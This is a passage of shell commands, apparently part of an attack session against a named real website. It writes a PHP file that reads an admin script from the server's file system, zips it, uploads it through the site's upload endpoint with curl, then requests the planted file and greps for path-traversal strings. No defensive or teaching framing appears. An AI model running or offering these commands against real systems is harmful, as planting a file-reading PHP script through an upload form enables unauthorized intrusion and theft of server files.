<?php echo file_get_contents('/home/h417440/panel.silveriom.ir/admin.js'); EOF
zip -r get_admin_js.zip get_admin_js.php
curl -s -X POST -F "file=@get_admin_js.zip" https://silveriom.ir/upload_subdomain.php
curl -s "https://panel.silveriom.ir/get_admin_js.php" | grep "\.\.\/"